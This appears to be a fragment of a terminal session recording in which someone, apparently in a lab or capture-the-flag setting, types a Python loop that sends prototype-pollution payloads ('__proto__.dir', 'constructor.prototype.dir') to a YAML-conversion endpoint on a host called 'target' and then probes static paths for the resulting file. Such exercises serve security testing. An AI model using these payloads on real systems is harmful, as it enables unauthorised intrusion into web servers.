[3274.381796, "o", "> "]
[3274.381914, "o", "dirs = [\"/app/public\", \"/app/static\", \"/public\", \"/static\", \".\", \"./public\", \"./static\", \"/app\"]\r\n\u001b[?2004l\r"]
[3274.38205, "o", "\u001b[?2004h> "]
[3274.382192, "o", "for d in dirs:\r\n\u001b[?2004l\r\u001b[?2004h> "]
[3274.3823, "o", "    o = json.loads(json.dumps(orig))\r\n\u001b[?2004l\r\u001b[?2004h> "]
[3274.382413, "o", "    o[\"data\"][\"__proto__.dir\"] = d\r\n\u001b[?2004l\r\u001b[?2004h> "]
[3274.382585, "o", "    o[\"data\"][\"constructor.prototype.dir\"] = d\r\n\u001b[?2004l\r"]
[3274.382677, "o", "\u001b[?2004h> "]
[3274.382937, "o", "    req = urllib.request.Request(\"http://target:8121/convert-to-yaml\", method=\"POST\", data=json.dumps(o).encode())\r\n\u001b[?2004l\r"]
[3274.382974, "o", "\u001b[?2004h> "]
[3274.383188, "o", "    req.add_header(\"Content-Type\", \"application/json\")\r\n\u001b[?2004l\r\u001b[?2004h> "]
[3274.383294, "o", "    try:\r\n\u001b[?2004l\r\u001b[?2004h> "]
[3274.383436, "o", "        r = urllib.request.urlopen(req)\r\n\u001b[?2004l\r"]
[3274.383524, "o", "\u001b[?2004h> "]
[3274.383645, "o", "        msg = json.loads(r.read().decode())[\"msg\"]\r\n\u001b[?2004l\r"]
[3274.383741, "o", "\u001b[?2004h> "]
[3274.383934, "o", "        for p in [f\"/{msg}\", f\"/public/{msg}\", f\"/static/{msg}\"]:\r\n\u001b[?2004l\r"]
[3274.384002, "o", "\u001b[?2004h> "]
[3274.384074, "o", "            try:\r\n\u001b[?2004l\r\u001b[?2004h> "]
[3274.384348, "o", "                res2 = urllib.request.urlopen(\"http://target:8121\" + p)\r\n\u001b[?2004l\r"]
[3274.384393, "o", "\u001b[?2004h> "]
[3274.384555, "o", "                if len(res2.read()) != 13:\r\n\u001b[?2004l\r"]
[3274.384598, "o", "\u001b[?2004h> "]
[3274.384849, "o", "                    print(f\"[STATIC] Found file at {p} with dir {d}\")\r\n\u001b[?2004l\r"]
[3274.384892, "o", "\u001b[?2004h> "]
[3274.384985, "o", "            except: pass\r\n\u001b[?2004l\r"]
[3274.385027, "o", "\u001b[?2004h> "]
[3274.385206, "o", "    except Exception as e: print(\"Dir Crash:\", e)\r\n\u001b[?2004l\r"]
[3274.385309, "o", "\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
